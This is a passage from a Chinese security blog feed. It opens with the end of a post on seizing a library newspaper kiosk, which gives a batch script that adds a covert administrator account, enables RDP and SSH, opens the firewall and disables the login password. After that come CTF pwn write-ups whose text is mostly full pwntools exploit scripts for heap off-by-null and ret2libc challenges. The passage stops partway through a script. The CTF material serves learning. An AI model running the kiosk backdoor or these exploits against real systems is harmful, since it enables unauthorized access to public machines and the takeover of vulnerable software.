控端看到，完全可以传一个远控码过去，因为没有能绕过监控的码（菜），不过应该是可以用teamviewer放到白名单然后开机自启动吧hhh。</p><p>没有码只能建个新的管理员权限的用户然后开通ssh服务远程连接使用，为了方便流程写了个bat脚本,隐藏用户的方法没建成功，就在最后设置成开机不要求密码来解决每天自动开机后卡在登陆界面的问题（主要是为了方便操作，没有能够隐蔽操作，打开文件之类的都是拿teamviewer提前传好的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">net user administratore admin /add</span><br><span class="line">net user administratore /active:yes</span><br><span class="line">net user administratore /expires:never</span><br><span class="line">net localgroup Administrators administratore /add</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start C:\Users\Administrator\Library\setupssh-8.0p1-2.exe </span><br><span class="line">pause</span><br><span class="line">cd C:\openSSH\bin</span><br><span class="line">mkgroup -l &gt;&gt; ..\etc\group</span><br><span class="line">mkpasswd -l &gt;&gt; ..\etc\passwd</span><br><span class="line">md home</span><br><span class="line">md home\Administrator</span><br><span class="line">md home\Administrator\.ssh</span><br><span class="line"></span><br><span class="line">echo C:\openSSH</span><br><span class="line">echo Protocol 2  &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitRootLogin no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitEmptyPasswords no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PasswordAuthentication yes    &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo RSAAuthentication yes       &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PubkeyAuthentication yes   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo AuthorizedKeysFile .ssh/authorized_keys &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">net start opensshd</span><br><span class="line"></span><br><span class="line">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home Yes</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v native /t REG_SZ /d &quot;C:\openSSH\home&quot;</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v flags /t REG_DWORD /d 0x0000000a</span><br><span class="line"></span><br><span class="line">start control userpassword2</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来&lt;/p&gt;
&lt;p&gt;一般触控的主机，长按是相当于鼠标右键的点击的，在主
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>off-by-null --more challenge</title>
    <link href="http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/"/>
    <id>http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/</id>
    <published>2019-06-08T00:49:05.000Z</published>
    <updated>2019-06-10T05:05:29.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>之前随便出的题</p><h2 id="障碍"><a href="#障碍" class="headerlink" title="障碍"></a>障碍</h2><p>低版本libc，没有开启PIE，常见的四项功能都有，edit中存在off-by-null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void get_str(char *ptr,int size)&#123;</span><br><span class="line">    int tmp=0;</span><br><span class="line">    if(size&lt;0)&#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;size;i++)&#123;</span><br><span class="line">        read(0,(ptr+i),1);</span><br><span class="line">        tmp = i;</span><br><span class="line">        if(*(ptr+i)==&apos;\n&apos;)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(ptr+tmp+1)=0;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前信安大赛提供的赛题就是这个难度的洞，上面为源码。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>没有开启PIE其实就很简单，基本上各方面都没有太多限制，通过溢出overlap来控制指针，下面要么直接控制修改malloc_hook处，要么麻烦一点改bss段指针再任意地址写getshell，之前是直接修改为one_gadget后条件不满足，顺便就把PIE给关了，难度低一点友好点没啥坏处。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./tinynote&apos;)</span><br><span class="line">elf = ELF(&apos;./tinynote&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">        sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">#--------------over lapping---------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">add(0x18,&apos;1&apos;)</span><br><span class="line">add(0x18,&apos;2&apos;)</span><br><span class="line">add(0x110,&apos;3&apos;*0xf0+p64(0x100)+p64(0x21))</span><br><span class="line">add(0x18,&apos;4&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">edit(2,0x18,&apos;2&apos;*0x10+p64(0xe0))</span><br><span class="line">dele(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------leak libc---------------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">show(1)</span><br><span class="line">leak = u64(sh.recv(8))</span><br><span class="line">libc_base = leak-88-0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line">one = libc_base +0x4526a#+libc.symbols[&apos;system&apos;]</span><br><span class="line">#--------------------------------------</span><br><span class="line">#edit(1,0x18,p64(leak)+p64(leak-88-0x33))</span><br><span class="line">#add(0x60,&apos;a&apos;*0x13)</span><br><span class="line">add(0x18,&apos;3&apos;)</span><br><span class="line">add(0x60,&apos;5&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">edit(5,8,p64(0x60203d))</span><br><span class="line">add(0x60,&apos;2&apos;)</span><br><span class="line">add(0x60,&apos;\x00&apos;*0x13+p64(0x90)+p64(1)+p64(libc.symbols[&apos;__free_hook&apos;]+libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0,8,p64(one))</span><br><span class="line">dele(2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>西湖论剑的一道题目貌似</p><h2 id="障碍-1"><a href="#障碍-1" class="headerlink" title="障碍"></a>障碍</h2><p>libc版本升级到2.27左右，存在tcache机制，许多操作开始需要绕过tcache机制来实现，但整体思路没有太大的变化。<br>同时这个题的溢出点从edit到了add，相对麻烦一点就是了。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>多分配一些chunk来将tcache填满，之后对剩下的chunk进行off-by-null实现overlap，好处就是tcache减少了对size的检查，后面更容易实现</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">    sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>rctf 2019-babyheap</p><h2 id="障碍-2"><a href="#障碍-2" class="headerlink" title="障碍"></a>障碍</h2><p>较低版本libc，开启PIE，但是禁用了fastbin，同时关闭了system execve的系统调用<br>这样基本上无法覆盖bss段的指针，即使想办法可以控制malloc_hook或free_hook指针，也无法直接系统调用getshell</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>通过chunk overlap泄露libc地址，再次调用通过house of storm控制<strong>free_hook，<br>把</strong>free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，<br>然后读入我们新的shellcode，在跳到新的shellcode去执行getshell。</p><p>另一种思路，泄露堆地址与libc地址，写rop, shellcode到heap，largebin attack &amp; unsortbin attack直接在libc上的free_hook分配chunk<br>将栈转移到heap上，执行rop，执行shellcode getshell。</p><p>这里的shellcode都是通过open read write来实现flag的读取。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>待补充<br><a href="https://xz.aliyun.com/t/5216#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;level-0&quot;&gt;&lt;a href=&quot;#level-0&quot; class=&quot;headerlink&quot; title=&quot;level 0&quot;&gt;&lt;/a&gt;level 0&lt;/h1&gt;&lt;p&gt;之前随便出的题&lt;/p&gt;
&lt;h2 id=&quot;障碍&quot;&gt;&lt;a href=&quot;#障碍&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2019 pwn</title>
    <link href="http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/</id>
    <published>2019-06-04T13:20:37.000Z</published>
    <updated>2019-06-07T02:12:03.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>ret2libc</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;Emachine&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;172.29.32.110&apos;,&apos;8888&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def en(enc):</span><br><span class="line">s = []</span><br><span class="line">res = 0</span><br><span class="line">for i in range(8):</span><br><span class="line">sk = enc % 0x100</span><br><span class="line">enc = (enc - sk)/0x100 </span><br><span class="line">s.append(sk)</span><br><span class="line"></span><br><span class="line">for x in s:</span><br><span class="line">if x&gt;47 and x &lt;57:</span><br><span class="line">x ^= 0xf</span><br><span class="line">elif x&lt;= 64 and x &gt;90:</span><br><span class="line">x ^= 0xe</span><br><span class="line">elif x&lt;=96 and x&gt;122:</span><br><span class="line">x ^= 0xd</span><br><span class="line">res = x + res*0x100</span><br><span class="line">print s</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400c83</span><br><span class="line">#main = 0x400b28</span><br><span class="line">start = 0x400790</span><br><span class="line">sh.sendlineafter(&quot;Input your choice!\n&quot;,&apos;1&apos;)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.symbols[&apos;puts&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;oooooooo&apos;)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">leak = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">#print hex(e)</span><br><span class="line">#leak =en(e)</span><br><span class="line">print hex(leak)</span><br><span class="line">system = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;system&apos;]</span><br><span class="line">#environ = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;environ&apos;]</span><br><span class="line">read = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;read&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line">print hex(read)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">pop_rsi_r15 = 0x0000000000400c81</span><br><span class="line">#pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602080)+p64(0)+p64(read)+p64(start)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(elf.symbols[&apos;gets&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(system)+p64(start)</span><br><span class="line">sh.send(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>当时没看，血亏。</p><h2 id="题目-amp-amp-分析-1"><a href="#题目-amp-amp-分析-1" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>溢出+uaf漏洞</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = 